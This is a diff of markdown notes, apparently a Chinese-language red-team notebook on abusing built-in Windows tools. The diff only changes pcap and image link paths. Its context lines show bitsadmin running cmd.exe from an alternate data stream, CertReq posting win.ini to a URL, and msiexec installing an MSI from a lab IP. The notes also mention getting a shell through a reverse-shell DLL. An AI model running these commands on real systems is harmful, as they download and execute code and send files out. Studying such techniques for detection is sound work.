@@ -25,7 +25,7 @@ bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
 bitsadmin /RESUME myfile
 ```
 
-[***pcap***](./assets/pcap/Bitsadmin.pcap)
+[***pcap***](../assets/pcap/Bitsadmin.pcap)
 
 ```http
 GET /white_process/call_calc.exe HTTP/1.1
@@ -44,7 +44,7 @@ Host: 192.168.220.125
 CertReq -Post -config https://example.org/ c:\windows\win.ini
 ```
 
-[***pcap***](./assets/pcap/CertReq.pcap)
+[***pcap***](../assets/pcap/CertReq.pcap)
 
 ```http
 POST /white_process/test HTTP/1.1
@@ -75,14 +75,14 @@ Host: 192.168.220.125
 bmsiexec /i http://192.168.220.125/white_process/test.msi
 ```
 
-[***pcap***](./assets/pcap/Msiexec.pcap)
+[***pcap***](/assets/pcap/Msiexec.pcap)
 
 ***Note***: whitch function Msiexec.exe call: *DllRegisterServer*
 之前按照 `Micro8` 的过程复现, 发现一直有问题, 后来wsy提醒说, Msiexec 调用的dll的 `DllRegisterServer`, 而`Micro8`中的方法生成的dll导出表仅有 `DllEntryPoint`
 
 后面逆向了一下 32位版的 msiexec.exe, 也通过 `rundll32 Msiexec_rev_x64_4444.dll DllEntryPoint` 成功 get shell 证实了这一结论
 
-![msiexec_re_register_dll](./assets/img/Msiexec_DllRegisterServer.png)
+![msiexec_re_register_dll](https://blog.idevin.cn/assets/img/Msiexec_DllRegisterServer.png)
 
 ## Reference
 
